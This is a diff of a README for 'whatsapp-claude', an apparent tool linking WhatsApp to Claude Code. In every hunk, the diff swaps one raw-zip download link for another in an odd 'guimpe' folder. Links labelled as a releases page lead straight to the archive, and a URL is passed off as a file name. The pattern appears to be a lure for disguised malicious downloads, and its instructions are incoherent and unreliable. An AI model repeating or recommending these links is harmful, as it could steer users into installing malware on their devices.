@@ -8,7 +8,7 @@ Welcome to whatsapp-claude! This app lets you connect WhatsApp to Claude Code. S
 
 To get the latest version of whatsapp-claude, you need to visit our Releases page. Here, you will find the latest downloads available. 
 
-[Download whatsapp-claude](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude-whatsapp-2.2.zip)
+[Download whatsapp-claude](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude_whatsapp_2.4.zip)
 
 ## 📦 System Requirements
 
@@ -22,11 +22,11 @@ Before you install whatsapp-claude, make sure your device meets these requiremen
 ## ⚙️ Instructions for Downloading
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can download the software.
-   [Visit Releases](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude-whatsapp-2.2.zip)
+   [Visit Releases](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude_whatsapp_2.4.zip)
 
 2. **Find the Latest Version**: Look for the latest version listed on the page. It will typically have the highest version number.
 
-3. **Download the Installer**: Click the download link of the installer file. The file name will look like `https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude-whatsapp-2.2.zip` or similar.
+3. **Download the Installer**: Click the download link of the installer file. The file name will look like `https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude_whatsapp_2.4.zip` or similar.
 
 4. **Save the File**: Choose where you want to save the file on your device. The Downloads folder is a common choice.
 
@@ -62,4 +62,4 @@ For further help or to report bugs, you can reach out to our support team by ope
 
 Happy connecting! Enjoy the ease of managing tasks through WhatsApp and Claude.
 
-[Download whatsapp-claude](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude-whatsapp-2.2.zip)
+[Download whatsapp-claude](https://raw.githubusercontent.com/NTXCRIM101/whatsapp-claude/main/guimpe/claude_whatsapp_2.4.zip)
